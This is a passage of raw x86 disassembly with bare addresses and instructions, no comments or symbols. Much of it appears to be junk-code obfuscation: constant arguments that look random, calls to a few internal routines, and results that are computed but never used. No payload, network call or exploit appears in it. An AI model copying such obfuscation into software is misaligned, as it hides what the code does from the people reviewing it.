  4077c0:	call   0x4082a5
  4077c5:	add    esp,0xc
  4077c8:	cmp    eax,0x82062041
  4077cd:	je     0x40782e
  4077cf:	push   0xffffffed
  4077d1:	call   0x408783
  4077d6:	add    esp,0x4
  4077d9:	push   0x3657e800
  4077de:	call   0x407d25
  4077e3:	add    esp,0x4
  4077e6:	push   0x2c61f700
  4077eb:	push   0xffffffde
  4077ed:	call   0x408949
  4077f2:	add    esp,0x8
  4077f5:	sub    DWORD PTR [ebp-0x1c],edi
  4077f8:	add    esi,edi
  4077fa:	push   0xf697b400
  4077ff:	call   0x407edf
  407804:	add    esp,0x4
  407807:	push   0x72
  407809:	push   0xffffffb8
  40780b:	call   0x408949
  407810:	add    esp,0x8
  407813:	push   0xffffffc9
  407815:	push   0xffffff81
  407817:	push   0xae8ef800
  40781c:	push   0xffffff86
  40781e:	call   0x408783
  407823:	add    esp,0x10
  407826:	call   0x407fe2
  40782b:	add    DWORD PTR [ebp-0x1c],esi
  40782e:	push   0x6d
  407830:	push   0x8e3c8600
  407835:	push   0x1c
  407837:	push   0xcc03bd00
  40783c:	call   0x408949
  407841:	add    esp,0x10
  407844:	mov    edi,DWORD PTR [ebp-0x10]
  407847:	mov    ebx,0x36
  40784c:	sub    DWORD PTR [ebp-0x1c],ebx
  40784f:	mov    ebx,0x76
  407854:	call   0x408515
  407859:	push   0xffffff84
  40785b:	push   0x9c001200
  407860:	push   0xffffffd4
  407862:	push   0x19
  407864:	push   0xc7c6d00
  407869:	call   0x408624
  40786e:	add    esp,0x14
  407871:	call   0x408783
  407876:	sub    DWORD PTR [ebp-0x1c],ebx
  407879:	mov    eax,DWORD PTR [ebp-0x24]
  40787c:	mov    edx,DWORD PTR [ebp-0x1c]
  40787f:	and    DWORD PTR [ebp-0x1c],edi
  407882:	add    edx,edx
  407884:	mov    ecx,DWORD PTR [ebp-0x1c]
  407887:	add    edx,ecx
  407889:	test   edx,0x51
  40788f:	je     0x4078d1
  407891:	add    edx,edx
  407893:	sub    edx,ebx
  407895:	mov    esi,DWORD PTR [ebp-0x1c]
  407898:	xor    ecx,ecx
  40789a:	sub    edx,ebx
  40789c:	mov    DWORD PTR [ebp-0x1c],ecx
  40789f:	cmp    esi,DWORD PTR ds:0x4373c8
  4078a5:	je     0x4078d1
  4078a7:	mov    ecx,0x52
  4078ac:	sub    edx,eax
  4078ae:	mov    ebx,DWORD PTR [ebp-0x1c]
  4078b1:	or     DWORD PTR [ebp-0x1c],edx
  4078b4:	sub    ebx,edi
  4078b6:	sub    DWORD PTR [ebp-0x1c],ecx
  4078b9:	cmp    ebx,esi
  4078bb:	jne    0x4078d1
  4078bd:	mov    edx,DWORD PTR [ebp-0x1c]
  4078c0:	sub    DWORD PTR [ebp-0x1c],esi
  4078c3:	cmp    ebx,DWORD PTR ds:0x4373c8
  4078c9:	je     0x4078d1
  4078cb:	add    DWORD PTR [ebp-0x1c],edx
  4078ce:	sub    DWORD PTR [ebp-0x1c],ebx
  4078d1:	mov    esi,DWORD PTR [eax]
  4078d3:	add    DWORD PTR [ebp-0x1c],esi
  4078d6:	mov    ecx,DWORD PTR [eax+0x4]
  4078d9:	cmp    ecx,DWORD PTR ds:0x4373c8
  4078df:	je     0x4078f9
  4078e1:	mov    eax,DWORD PTR [ebp-0x1c]
  4078e4:	add    DWORD PTR [ebp-0x1c],ecx
  4078e7:	mov    edx,DWORD PTR [ebp-0x1c]
  4078ea:	or     eax,esi
  4078ec:	sub    eax,ebx
  4078ee:	mov    DWORD PTR [ebp-0x1c],eax
  4078f1:	cmp    edx,DWORD PTR [ebp-0x28]
  4078f4:	je     0x4078f9
  4078f6:	or     DWORD PTR [ebp-0x1c],edx
  4078f9:	or     esi,esi
  4078fb:	je     0x407a0c
  407901:	cmp    eax,ebx
  407903:	je     0x407910
  407905:	mov    eax,DWORD PTR [ebp-0x1c]
  407908:	xor    ebx,ebx
  40790a:	sub    DWORD PTR [ebp-0x1c],eax
  40790d:	sub    DWORD PTR [ebp-0x1c],ebx
  407910:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407912:	push   0x77
  407914:	push   0xe
  407916:	push   0xffffffd6
  407918:	push   0x35
  40791a:	call   0x408515
  40791f:	add    esp,0x10
  407922:	xor    edx,edx
  407924:	call   0x408783
  407929:	cmp    edi,DWORD PTR [ebp-0x18]
  40792c:	jne    0x4079dc
  407932:	push   0xffffffef
  407934:	push   0xffffffef
  407936:	push   0xffffffb1
  407938:	push   0x36
  40793a:	call   0x407fe2
  40793f:	add    esp,0x10
  407942:	push   0xdc327000
  407947:	push   0xe065500
  40794c:	push   0xffffffff
  40794e:	push   0xae14b700
  407953:	push   0x4d
  407955:	call   0x408197
  40795a:	add    esp,0x14
  40795d:	mov    edx,ebx
  40795f:	call   0x408949
  407964:	push   0x50
  407966:	push   0xffffff88
  407968:	push   0x7c53ee00
  40796d:	push   0x6ec6fb00
  407972:	push   0x2c033700
  407977:	call   0x4082a5
  40797c:	add    esp,0x14
  40797f:	mov    ecx,DWORD PTR [ebp-0x1c]
  407982:	push   0x6a
  407984:	push   0x2d
  407986:	push   0xdc703d00
  40798b:	call   0x407ba2
  407990:	add    esp,0xc
  407993:	call   0x408783
  407998:	call   0x408624
  40799d:	push   0x3c3fc800
  4079a2:	push   0xffffffc4
  4079a4:	push   0xffffffec
  4079a6:	push   0x6ef4f400
  4079ab:	call   0x407ba2
  4079b0:	add    esp,0x10
  4079b3:	push   0x3290ae00
  4079b8:	push   0x62
  4079ba:	push   0x76a5b300
  4079bf:	push   0xffffffde
  4079c1:	call   0x408949
  4079c6:	add    esp,0x10
  4079c9:	push   0xa
  4079cb:	push   0x26
  4079cd:	push   0xffffff96
  4079cf:	push   0x6
  4079d1:	call   0x407edf
  4079d6:	add    esp,0x10
  4079d9:	or     DWORD PTR [ebp-0x1c],esi
  4079dc:	add    DWORD PTR [ebp-0x24],0x8
  4079e0:	xor    eax,eax
  4079e2:	add    eax,edi
  4079e4:	push   0x6b
  4079e6:	call   0x408783
  4079eb:	add    esp,0x4
  4079ee:	push   0x8e35c400
  4079f3:	push   0x25
  4079f5:	push   0x2c035400
  4079fa:	push   0x86de3b00
  4079ff:	call   0x407edf
  407a04:	add    esp,0x10
  407a07:	jmp    0x407847
  407a0c:	mov    ebx,DWORD PTR [ebp-0x1c]
  407a0f:	mov    esi,DWORD PTR [ebp-0x1c]
  407a12:	push   0xffffffca
  407a14:	push   0x7c4ce500
  407a19:	call   0x4082a5
  407a1e:	add    esp,0x8
  407a21:	push   0x71
  407a23:	push   0x5c294f00
  407a28:	push   0x5edd9000
  407a2d:	push   0x8e402500
  407a32:	push   0xefbcf00
  407a37:	call   0x408197
  407a3c:	add    esp,0x14
  407a3f:	xor    DWORD PTR [ebp-0x1c],ebx
  407a42:	push   0x78
  407a44:	call   0x408197
  407a49:	add    esp,0x4
  407a4c:	call   0x407edf
  407a51:	push   0xffffffc7
  407a53:	call   0x407d25
  407a58:	add    esp,0x4
  407a5b:	push   0xb649b400
  407a60:	push   0xae217200
  407a65:	push   0x2a48600
  407a6a:	call   0x408197
  407a6f:	add    esp,0xc
  407a72:	call   0x408515
  407a77:	call   0x408197
  407a7c:	cmp    esi,eax
  407a7e:	jne    0x407abe
  407a80:	mov    ecx,0x55
  407a85:	call   0x408624
  407a8a:	push   0xffffff9b
  407a8c:	push   0xc2efea00
  407a91:	call   0x408949
  407a96:	add    esp,0x8
  407a99:	push   0xc193000
  407a9e:	push   0x6a
  407aa0:	call   0x407edf
  407aa5:	add    esp,0x8
  407aa8:	add    esi,edi
  407aaa:	or     esi,eax
  407aac:	push   0x0
  407aae:	push   0xcc32e000
  407ab3:	call   0x408515
  407ab8:	add    esp,0x8
  407abb:	sub    DWORD PTR [ebp-0x1c],esi
  407abe:	push   0xffffffc4
  407ac0:	call   0x407d25
  407ac5:	add    esp,0x4
  407ac8:	cmp    esi,0x3114
  407ace:	jne    0x407add
  407ad0:	cmp    esi,0x9438
  407ad6:	jne    0x407add
  407ad8:	call   0x408949
  407add:	mov    eax,DWORD PTR [ebp-0x10]
  407ae0:	add    DWORD PTR [ebp-0x1c],ebx
  407ae3:	cmp    esi,DWORD PTR [ebp-0x20]
  407ae6:	jne    0x407b0e
  407ae8:	mov    ebx,DWORD PTR [ebp-0x1c]
  407aeb:	cmp    ebx,DWORD PTR ds:0x4373c8
  407af1:	je     0x407b0e
  407af3:	xor    edi,edi
  407af5:	mov    esi,DWORD PTR [ebp-0x1c]
  407af8:	add    DWORD PTR [ebp-0x1c],ebx
  407afb:	add    DWORD PTR [ebp-0x1c],esi
  407afe:	test   esi,0x7b9a
  407b04:	jne    0x407b0e
  407b06:	and    edi,esi
  407b08:	mov    DWORD PTR [ebp-0xc],eax
  407b0b:	add    DWORD PTR [ebp-0x1c],edi
  407b0e:	pop    edi
  407b0f:	xor    edx,edx
  407b11:	cmp    esi,edi
  407b13:	jne    0x407b42
  407b15:	cmp    edi,0x94f0
  407b1b:	jne    0x407b42
  407b1d:	xor    ebx,ebx
  407b1f:	mov    esi,DWORD PTR [ebp-0x1c]
  407b22:	add    ebx,ebx
  407b24:	sub    DWORD PTR [ebp-0x1c],ebx
  407b27:	add    DWORD PTR [ebp-0x1c],edi
  407b2a:	sub    edx,ebx
  407b2c:	test   esi,0xd5
  407b32:	jne    0x407b42
  407b34:	add    DWORD PTR [ebp-0x1c],edx
  407b37:	cmp    edi,DWORD PTR ds:0x4373c8
  407b3d:	je     0x407b42
  407b3f:	add    DWORD PTR [ebp-0x1c],esi
  407b42:	pop    esi
  407b43:	cmp    esi,0x4e
  407b46:	jne    0x407b5c
  407b48:	and    edx,ebx
  407b4a:	sub    edx,eax
  407b4c:	add    edx,eax
  407b4e:	xor    ebx,ebx
  407b50:	add    edx,edi
  407b52:	xor    ebx,ebx
  407b54:	add    ebx,edi
  407b56:	mov    DWORD PTR [ebp-0x1c],ebx
  407b59:	add    DWORD PTR [ebp-0x1c],edx
  407b5c:	pop    ebx
  407b5d:	mov    ecx,DWORD PTR [ebp-0x1c]
  407b60:	sub    ecx,eax
  407b62:	xor    edx,edx
  407b64:	add    DWORD PTR [ebp-0x1c],ebx
  407b67:	cmp    ecx,0xac4822a3
  407b6d:	jne    0x407b9b
  407b6f:	mov    DWORD PTR [ebp-0x1c],edx
  407b72:	mov    edx,0xb9
  407b77:	cmp    ecx,DWORD PTR [ebp-0x14]
  407b7a:	je     0x407b9b
  407b7c:	add    DWORD PTR [ebp-0x1c],edx
  407b7f:	add    DWORD PTR [ebp-0x1c],eax
  407b82:	xor    edx,edx
  407b84:	sub    ecx,esi
  407b86:	sub    edx,eax
  407b88:	add    DWORD PTR [ebp-0x1c],edx
  407b8b:	sub    ecx,edi
  407b8d:	mov    edx,0x81
  407b92:	sub    edx,eax
  407b94:	add    edx,edx
  407b96:	and    edx,ecx
  407b98:	add    DWORD PTR [ebp-0x1c],edx
  407b9b:	leave  
  407b9c:	ret    
  407b9d:	int3   
  407b9e:	int3   
  407b9f:	int3   
  407ba0:	int3   
  407ba1:	int3   
  407ba2:	push   ebp
  407ba3:	mov    ebp,esp
  407ba5:	sub    esp,0x2c
  407ba8:	push   0xffffffd2
  407baa:	push   0x31
  407bac:	push   0xfffffffe
  407bae:	call   0x4082a5
  407bb3:	add    esp,0xc
  407bb6:	push   ebx
  407bb7:	cmp    eax,0x690e
  407bbc:	je     0x407bc3
  407bbe:	call   0x4082a5
  407bc3:	push   0x4f
  407bc5:	push   0xf6623e00
  407bca:	push   0x76ab7a00
  407bcf:	call   0x4082a5
  407bd4:	add    esp,0xc
  407bd7:	push   esi
  407bd8:	push   0x2e
  407bda:	push   0xffffffc2
  407bdc:	push   0xbeaf1100
  407be1:	call   0x408515
  407be6:	add    esp,0xc
  407be9:	push   0x7606c700
  407bee:	call   0x408783
  407bf3:	add    esp,0x4
  407bf6:	push   edi
  407bf7:	push   0x82ec7800
  407bfc:	push   0x96a20d00
  407c01:	call   0x408197
  407c06:	add    esp,0x8
  407c09:	push   0x3ecb6800
  407c0e:	push   0xfc7c2e00
  407c13:	push   0x79
  407c15:	call   0x408949
  407c1a:	add    esp,0xc
  407c1d:	cmp    eax,DWORD PTR [ebp-0x10]
  407c20:	jne    0x407c81
  407c22:	mov    edi,0xb4
  407c27:	call   0x4082a5
  407c2c:	push   0xec6db500
  407c31:	push   0x76b9bb00
  407c36:	push   0xffffffb1
  407c38:	push   0x8e588600
  407c3d:	call   0x408197
  407c42:	add    esp,0x10
  407c45:	cmp    eax,edi
  407c47:	je     0x407c81
  407c49:	call   0x408949
  407c4e:	push   0x76
  407c50:	push   0x9ef99f00
  407c55:	push   0xae025e00
  407c5a:	call   0x408197
  407c5f:	add    esp,0xc
  407c62:	push   0xf2f6af00
  407c67:	push   0xa2d9d600
  407c6c:	push   0xd29ce200
  407c71:	push   0x4eba4800
  407c76:	call   0x408949
  407c7b:	add    esp,0x10
  407c7e:	mov    DWORD PTR [ebp-0x8],edi
  407c81:	push   0x2a
  407c83:	push   0x8c6e5700
  407c88:	call   0x408624
  407c8d:	add    esp,0x8
  407c90:	call   0x408624
  407c95:	call   0x408624
  407c9a:	push   0x59
  407c9c:	push   0xac4f6e00
  407ca1:	push   0xffffff9a
  407ca3:	push   0x760d4e00
  407ca8:	call   0x408624
  407cad:	add    esp,0x10
  407cb0:	push   0x8aaccf00
  407cb5:	push   0xe6a81b00
  407cba:	push   0xae16b500
  407cbf:	push   0xb
  407cc1:	push   0x66fa7800
  407cc6:	call   0x408949
  407ccb:	add    esp,0x14
  407cce:	call   0x408624
  407cd3:	push   0x3c556000
  407cd8:	push   0x15
  407cda:	push   0xb6ff9600
  407cdf:	push   0xffffffdf
  407ce1:	call   0x408783
  407ce6:	add    esp,0x10
  407ce9:	pop    edi
  407cea:	mov    ecx,0x84
  407cef:	add    ecx,ecx
  407cf1:	push   0x1d
  407cf3:	push   0x3c512c00
  407cf8:	push   0xd294ef00
  407cfd:	call   0x408197
  407d02:	add    esp,0xc
  407d05:	pop    esi
  407d06:	mov    DWORD PTR [ebp-0x1c],edi
  407d09:	pop    ebx
  407d0a:	mov    ecx,edi
  407d0c:	mov    edx,esi
  407d0e:	push   0x60
  407d10:	push   0xffffff94
  407d12:	push   0xffffff9f
  407d14:	push   0x49
  407d16:	call   0x408197
  407d1b:	add    esp,0x10
  407d1e:	leave  
  407d1f:	ret    
  407d20:	int3   
  407d21:	int3   
  407d22:	int3   
  407d23:	int3   
  407d24:	int3   
  407d25:	push   ebp
  407d26:	mov    ebp,esp
  407d28:	sub    esp,0x38
  407d2b:	push   0x36e56e00
  407d30:	call   0x408515
  407d35:	add    esp,0x4
  407d38:	push   0xffffff88
  407d3a:	push   0xffffffdc
  407d3c:	call   0x408783
  407d41:	add    esp,0x8
  407d44:	push   ebx
  407d45:	push   0x42f52a00
  407d4a:	push   0xffffffb5
  407d4c:	call   0x408783
  407d51:	add    esp,0x8
  407d54:	push   esi
  407d55:	push   0x429da400
  407d5a:	push   0x51
  407d5c:	call   0x408949
  407d61:	add    esp,0x8
  407d64:	push   edi
  407d65:	push   0x1c3f5500
  407d6a:	push   0x31
  407d6c:	push   0xc6e4c900
  407d71:	call   0x408783
  407d76:	add    esp,0xc
  407d79:	push   0xffffff82
  407d7b:	push   0x52892f00
  407d80:	push   0xf660a000
  407d85:	call   0x408624
  407d8a:	add    esp,0xc
  407d8d:	push   0x1c343a00
  407d92:	call   0x408515
  407d97:	add    esp,0x4
  407d9a:	call   0x408515
  407d9f:	push   0xffffff8d
  407da1:	push   0xae109600
  407da6:	call   0x408783
  407dab:	add    esp,0x8
  407dae:	xor    esi,esi
  407db0:	mov    DWORD PTR [ebp-0x28],esi
  407db3:	pop    edi
  407db4:	mov    ebx,0x81
  407db9:	add    DWORD PTR [ebp-0x28],edi
  407dbc:	push   0x58
  407dbe:	push   0x3ac43200
  407dc3:	push   0x5a99de00
  407dc8:	call   0x408783
  407dcd:	add    esp,0xc
  407dd0:	call   0x408197
  407dd5:	call   0x408515
  407dda:	add    ebx,esi
  407ddc:	sub    ebx,esi
  407dde:	mov    DWORD PTR [ebp-0x28],ebx
  407de1:	push   0xcc706b00
  407de6:	call   0x408197
  407deb:	add    esp,0x4
  407dee:	pop    esi
  407def:	xor    ebx,ebx
  407df1:	add    DWORD PTR [ebp-0x28],esi
  407df4:	push   0x35
  407df6:	call   0x408783
  407dfb:	add    esp,0x4
  407dfe:	call   0x408949
  407e03:	mov    edx,DWORD PTR [ebp-0x28]
  407e06:	push   0xea855100
  407e0b:	push   0x22bad000
  407e10:	push   0x28
  407e12:	push   0x9297d600
  407e17:	push   0x62c55b00
  407e1c:	call   0x408515
  407e21:	add    esp,0x14
  407e24:	push   0x49
  407e26:	push   0x40
  407e28:	push   0x1c21da00
  407e2d:	push   0xffffff9b
  407e2f:	call   0x408515
  407e34:	add    esp,0x10
  407e37:	push   0x4b
  407e39:	push   0x1f
  407e3b:	call   0x408197
  407e40:	add    esp,0x8
  407e43:	push   0x6a
  407e45:	push   0x63
  407e47:	call   0x408783
  407e4c:	add    esp,0x8
  407e4f:	push   0x7c63ab00
  407e54:	push   0xdc214200
  407e59:	push   0x8aca8200
  407e5e:	push   0x22ad8000
  407e63:	call   0x408783
  407e68:	add    esp,0x10
  407e6b:	push   0x5ef3bb00
  407e70:	push   0xffffffc8
  407e72:	push   0x6c
  407e74:	push   0xffffffad
  407e76:	call   0x408624
  407e7b:	add    esp,0x10
  407e7e:	push   0xe119200
  407e83:	push   0x2c378700
  407e88:	push   0x78
  407e8a:	push   0x36a9fa00
  407e8f:	call   0x408515
  407e94:	add    esp,0x10
  407e97:	push   0xbc410f00
  407e9c:	push   0x5c12be00
  407ea1:	push   0xf627fa00
  407ea6:	call   0x408197
  407eab:	add    esp,0xc
  407eae:	push   0x5e878900
  407eb3:	push   0xffffff85
  407eb5:	call   0x408949
  407eba:	add    esp,0x8
  407ebd:	mov    DWORD PTR [ebp-0x28],ebx
  407ec0:	pop    ebx
  407ec1:	cmp    ebx,0xffffffc9
  407ec4:	je     0x407ed8
  407ec6:	push   0xc6ba3700
  407ecb:	push   0x76405500
  407ed0:	call   0x408515
  407ed5:	add    esp,0x8
  407ed8:	leave  
  407ed9:	ret    
  407eda:	int3   
  407edb:	int3   
  407edc:	int3   
  407edd:	int3   
  407ede:	int3   
  407edf:	push   ebp
  407ee0:	mov    ebp,esp
  407ee2:	sub    esp,0x40
  407ee5:	xor    eax,eax
  407ee7:	add    eax,eax
  407ee9:	push   0xffffffb8
  407eeb:	call   0x408783
  407ef0:	add    esp,0x4
  407ef3:	push   ebx
  407ef4:	push   0xffffffcf
  407ef6:	push   0xbc47a000
  407efb:	call   0x4082a5
  407f00:	add    esp,0x8
  407f03:	push   esi
  407f04:	push   0xaea8b500
  407f09:	push   0xb63b1000
  407f0e:	call   0x408515
  407f13:	add    esp,0x8
  407f16:	push   edi
  407f17:	push   0x7a
  407f19:	push   0xeec31800
  407f1e:	call   0x4082a5
  407f23:	add    esp,0x8
  407f26:	mov    DWORD PTR [ebp-0x4],eax
  407f29:	push   0xffffffa3
  407f2b:	call   0x4082a5
  407f30:	add    esp,0x4
  407f33:	call   0x408624
  407f38:	push   0x6c0f3000
  407f3d:	push   0x76284600
  407f42:	call   0x408783
  407f47:	add    esp,0x8
  407f4a:	push   0x77
  407f4c:	call   0x408624
  407f51:	add    esp,0x4
  407f54:	call   0x408515
  407f59:	push   0xae4fc300
  407f5e:	call   0x408949
  407f63:	add    esp,0x4
  407f66:	push   0x3c352100
  407f6b:	push   0xffffff9b
  407f6d:	call   0x4082a5
  407f72:	add    esp,0x8
  407f75:	pop    edi
  407f76:	push   0xc
  407f78:	call   0x4082a5
  407f7d:	add    esp,0x4
  407f80:	push   0xe300b00
  407f85:	push   0x1e
  407f87:	push   0xcc511d00
  407f8c:	call   0x408515
  407f91:	add    esp,0xc
  407f94:	pop    esi
  407f95:	mov    eax,0x53
  407f9a:	cmp    esi,0x8e1a0201
  407fa0:	je     0x407fb7
  407fa2:	push   0xe5bb700
  407fa7:	push   0xffffffa0
  407fa9:	push   0x1d
  407fab:	push   0x57
  407fad:	push   0x7e
  407faf:	call   0x408515
  407fb4:	add    esp,0x14
  407fb7:	push   0x9abd0300
  407fbc:	push   0xffffffa0
  407fbe:	push   0x8c303b00
  407fc3:	call   0x408197
  407fc8:	add    esp,0xc
  407fcb:	pop    ebx
  407fcc:	mov    eax,DWORD PTR [ebp-0x4]
  407fcf:	push   0xffffff8d
  407fd1:	push   0x39
  407fd3:	call   0x408624
  407fd8:	add    esp,0x8
  407fdb:	leave  
  407fdc:	ret    
  407fdd:	int3   
  407fde:	int3   
  407fdf:	int3   
  407fe0:	int3   
  407fe1:	int3   
  407fe2:	push   ebp
  407fe3:	mov    ebp,esp
  407fe5:	sub    esp,0x24
  407fe8:	push   0x73
  407fea:	push   0x7b
  407fec:	push   0xffffff85
  407fee:	push   0xde813a00
  407ff3:	push   0xffffff82
  407ff5:	call   0x408624
  407ffa:	add    esp,0x14
  407ffd:	push   ebx
  407ffe:	push   0x70
  408000:	push   0x58
  408002:	push   0xffffffcc
  408004:	push   0x9aa5e400
  408009:	call   0x408949
  40800e:	add    esp,0x10
  408011:	push   esi
  408012:	mov    esi,0x36b0
  408017:	push   0x4a87d700
  40801c:	push   0xf6665800
  408021:	push   0x3c66c500
  408026:	push   0x6eaec500
  40802b:	call   0x408783
  408030:	add    esp,0x10
  408033:	xor    edx,edx
  408035:	push   0x6e8e6d00
  40803a:	push   0x6c00c300
  40803f:	push   0x3c1b8f00
  408044:	push   0xf60c0300
  408049:	push   0xf6543300
  40804e:	call   0x408515
  408053:	add    esp,0x14
  408056:	push   0x4eaa1100
  40805b:	push   0xb2a56100
  408060:	push   0x2c2b1200
  408065:	push   0xffffff83
  408067:	call   0x408197
  40806c:	add    esp,0x10
  40806f:	push   0x49
  408071:	push   0x2ab63600
  408076:	push   0x765ff300
  40807b:	push   0xbc1a7200
  408080:	push   0x8e4dcd00
  408085:	call   0x408624
  40808a:	add    esp,0x14
  40808d:	push   0xffffff8c
  40808f:	push   0x8afe2c00
  408094:	push   0x73
  408096:	push   0xffffffdc
  408098:	call   0x408197
  40809d:	add    esp,0x10
  4080a0:	and    esi,eax
  4080a2:	or     esi,eax
  4080a4:	mov    DWORD PTR [ebp-0x24],esi
  4080a7:	push   edi
  4080a8:	push   0x22858100
  4080ad:	push   0x36
  4080af:	push   0x1a
  4080b1:	call   0x4082a5
  4080b6:	add    esp,0xc
  4080b9:	push   0x62b51a00
  4080be:	push   0x32d6f800
  4080c3:	push   0x6c
  4080c5:	push   0x3c546e00
  4080ca:	push   0xac74300
  4080cf:	call   0x408197
  4080d4:	add    esp,0x14
  4080d7:	call   0x408515
  4080dc:	push   0xbe8ab700
  4080e1:	push   0x7c7b9500
  4080e6:	push   0x9c0d6d00
  4080eb:	call   0x408515
  4080f0:	add    esp,0xc
  4080f3:	push   0x36f8f000
  4080f8:	push   0x56
  4080fa:	push   0xffffffb0
  4080fc:	push   0x17
  4080fe:	call   0x408624
  408103:	add    esp,0x10
  408106:	push   0xffffffa7
  408108:	push   0x3c27ee00
  40810d:	call   0x408197
  408112:	add    esp,0x8
  408115:	call   0x408197
  40811a:	push   0x6eca2100
  40811f:	push   0xae5c3d00
  408124:	push   0x66e7a200
  408129:	push   0x70
  40812b:	call   0x4082a5
  408130:	add    esp,0x10
  408133:	push   0x9c18d600
  408138:	push   0xffffffe7
  40813a:	push   0xf6797400
  40813f:	push   0x82a77300
  408144:	call   0x408197
  408149:	add    esp,0x10
  40814c:	pop    edi
  40814d:	cmp    edi,0x1167
  408153:	je     0x408166
  408155:	sub    eax,esi
  408157:	push   0x6c0dbc00
  40815c:	push   0x2a
  40815e:	call   0x408624
  408163:	add    esp,0x8
  408166:	call   0x408197
  40816b:	pop    esi
  40816c:	push   0xffffffc2
  40816e:	push   0xffffff94
  408170:	call   0x408949
  408175:	add    esp,0x8
  408178:	push   0xffffff83
  40817a:	call   0x408624
  40817f:	add    esp,0x4
  408182:	pop    ebx
  408183:	sub    DWORD PTR [ebp-0x24],esi
  408186:	push   0x3c
  408188:	call   0x408624
  40818d:	add    esp,0x4
  408190:	leave  
  408191:	ret    
  408192:	int3   
  408193:	int3   
  408194:	int3   
  408195:	int3   
  408196:	int3   
  408197:	push   ebp
  408198:	mov    ebp,esp
  40819a:	sub    esp,0x30
  40819d:	push   0xffffffaf
  40819f:	push   0x3a
  4081a1:	push   0xffffffe0
  4081a3:	call   0x408624
  4081a8:	add    esp,0xc
  4081ab:	push   0xfed84600
  4081b0:	push   0x79
  4081b2:	push   0x32
  4081b4:	push   0xa6fafb00
  4081b9:	call   0x408783
  4081be:	add    esp,0x10
  4081c1:	push   ebx
  4081c2:	push   0x364c2c00
  4081c7:	push   0xffffffc2
  4081c9:	push   0x26
  4081cb:	push   0xae95e900
  4081d0:	call   0x408624
  4081d5:	add    esp,0x10
  4081d8:	push   esi
  4081d9:	mov    DWORD PTR [ebp-0x10],eax
  4081dc:	push   edi
  4081dd:	push   0x25
  4081df:	push   0xb2853f00
  4081e4:	push   0x12
  4081e6:	push   0x63
  4081e8:	call   0x408783
  4081ed:	add    esp,0x10
  4081f0:	xor    DWORD PTR [ebp-0x10],eax
  4081f3:	cmp    eax,DWORD PTR [ebp-0x24]
  4081f6:	jne    0x40822d
  4081f8:	mov    esi,eax
  4081fa:	push   0xffffffb9
  4081fc:	push   0xffffffbf
  4081fe:	push   0xae7d6200
  408203:	push   0x63
  408205:	push   0x2a8e9e00
  40820a:	call   0x408783
  40820f:	add    esp,0x14
  408212:	cmp    esi,eax
  408214:	jne    0x40822d
  408216:	mov    eax,esi
  408218:	push   0x5a911700
  40821d:	push   0x67
  40821f:	push   0xffffffaf
  408221:	push   0x79
  408223:	push   0xffffff8a
  408225:	call   0x408515
  40822a:	add    esp,0x14
  40822d:	push   0xffffffa8
  40822f:	call   0x408949
  408234:	add    esp,0x4
  408237:	mov    edx,0x11
  40823c:	call   0x408783
  408241:	mov    edx,0x8c
  408246:	add    edx,eax
  408248:	test   edx,0x1b
  40824e:	je     0x408253
  408250:	add    DWORD PTR [ebp-0x10],edx
  408253:	pop    edi
  408254:	xor    DWORD PTR [ebp-0x10],edi
  408257:	call   0x408783
  40825c:	pop    esi
  40825d:	push   0x9edd6100
  408262:	push   0x7
  408264:	push   0x2c360700
  408269:	push   0x7623ef00
  40826e:	call   0x408515
  408273:	add    esp,0x10
  408276:	push   0x5d
  408278:	push   0x3c
  40827a:	push   0xae128200
  40827f:	push   0xffffffa5
  408281:	call   0x408783
  408286:	add    esp,0x10
  408289:	pop    ebx
  40828a:	sub    DWORD PTR [ebp-0x10],ebx
  40828d:	push   0xffffffbe
  40828f:	push   0x6
  408291:	push   0xe735d00
  408296:	call   0x408624
  40829b:	add    esp,0xc
  40829e:	leave  
  40829f:	ret    
  4082a0:	int3   
  4082a1:	int3   
  4082a2:	int3   
  4082a3:	int3   
  4082a4:	int3   
  4082a5:	push   ebp
  4082a6:	mov    ebp,esp
  4082a8:	sub    esp,0x24
  4082ab:	xor    ecx,ecx
  4082ad:	push   0x58
  4082af:	push   0x6d
  4082b1:	push   0x7eb4ad00
  4082b6:	call   0x408515
  4082bb:	add    esp,0xc
  4082be:	call   0x408624
  4082c3:	push   ebx
  4082c4:	push   0xffffffe3
  4082c6:	push   0x63
  4082c8:	push   0x1b
  4082ca:	push   0x62
  4082cc:	push   0x7d
  4082ce:	call   0x408949
  4082d3:	add    esp,0x14
  4082d6:	push   0xffffffc0
  4082d8:	call   0x408624
  4082dd:	add    esp,0x4
  4082e0:	push   esi
  4082e1:	cmp    eax,0x84ce
  4082e6:	je     0x4082fa
  4082e8:	cmp    eax,0x55
  4082eb:	je     0x4082fa
  4082ed:	push   0xbafc4200
  4082f2:	call   0x408949
  4082f7:	add    esp,0x4
  4082fa:	push   0xc2bd9500
  4082ff:	push   0xee9c9c00
  408304:	call   0x408949
  408309:	add    esp,0x8
  40830c:	push   edi
  40830d:	call   0x408783
  408312:	push   0x9c3d2900
  408317:	push   0x1c
  408319:	push   0x4f
  40831b:	push   0x3656d500
  408320:	push   0x7c354500
  408325:	call   0x408624
  40832a:	add    esp,0x14
  40832d:	push   0x4c45df00
  408332:	push   0xffffffd5
  408334:	call   0x408624
  408339:	add    esp,0x8
  40833c:	push   0xfffffffa
  40833e:	push   0xffffffcc
  408340:	call   0x408624
  408345:	add    esp,0x8
  408348:	xor    ecx,ecx
  40834a:	push   0xbe828f00
  40834f:	call   0x408949
  408354:	add    esp,0x4
  408357:	push   0xffffff96
  408359:	push   0x72
  40835b:	push   0xfffffff7
  40835d:	push   0x56cc4400
  408362:	call   0x408624
  408367:	add    esp,0x10
  40836a:	mov    edx,0xd9
  40836f:	mov    DWORD PTR [ebp-0x1c],edx
  408372:	push   0xdae89200
  408377:	push   0xffffff9a
  408379:	push   0xffffff99
  40837b:	call   0x408783
  408380:	add    esp,0xc
  408383:	xor    ecx,ecx
  408385:	push   0x9
  408387:	push   0xc2c55c00
  40838c:	call   0x408783
  408391:	add    esp,0x8
  408394:	push   0xffffff84
  408396:	push   0x42c45100
  40839b:	push   0x20
  40839d:	call   0x408624
  4083a2:	add    esp,0xc
  4083a5:	pop    edi
  4083a6:	sub    eax,edi
  4083a8:	sub    eax,edi
  4083aa:	test   eax,0x2d
  4083af:	je     0x4084c4
  4083b5:	mov    ebx,DWORD PTR [ebp-0x1c]
  4083b8:	xor    ecx,ecx
  4083ba:	cmp    eax,DWORD PTR [ebp-0x14]
  4083bd:	jne    0x4084c4
  4083c3:	and    ebx,eax
  4083c5:	push   0xfffffff5
